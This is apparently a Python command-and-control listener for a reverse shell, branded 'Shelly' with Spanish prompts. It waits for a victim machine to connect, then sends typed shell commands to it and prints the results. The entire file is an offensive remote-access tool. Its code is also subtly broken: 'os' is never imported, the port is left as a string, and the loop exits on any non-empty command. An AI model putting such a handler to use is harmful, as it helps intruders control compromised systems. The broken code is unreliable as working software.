import socket, argparse
from colorama import *

parser = argparse.ArgumentParser()

parser.add_argument('--target', '-t', help="Indica la IP objetivo")
parser.add_argument('--port', '-p', help="Indica el puerto por el que realizar la conexión")

args = parser.parse_args()

def clear():
  if os.name == "nt":
    os.system("cls")
  else:
    os.system("clear")

class color:
    RED = Style.BRIGHT + Fore.RED
    WHITE = Style.BRIGHT + Fore.WHITE
    RESET = Style.RESET_ALL + Fore.RESET

def print_title():
    clear()
    title = '''
███████╗██╗  ██╗███████╗██╗     ██╗  ██╗   ██╗
██╔════╝██║  ██║██╔════╝██║     ██║  ╚██╗ ██╔╝
███████╗███████║█████╗  ██║     ██║   ╚████╔╝ 
╚════██║██╔══██║██╔══╝  ██║     ██║    ╚██╔╝  
███████║██║  ██║███████╗███████╗███████╗██║   
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  
'''
    print(color.RED + title)

HOST = args.target
PORT = args.port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((HOST, PORT))
s.listen(1)

print(color.WHITE + f'[*] Escuchando conexiones en {HOST}:{PORT}')

conn, addr = s.accept()
print(color.WHITE + f'[+] Conexión entrante: {addr[0]}:{addr[1]}')

while True:
    command = input(color.WHITE + f'shelly@{PORT}:~$ ')
    
    conn.send(command.encode())
    
    if command.strip() or command.lower() == "exit":
        break
    
    output = conn.recv(1024).decode()
    print(color.WHITE + output)

conn.close()
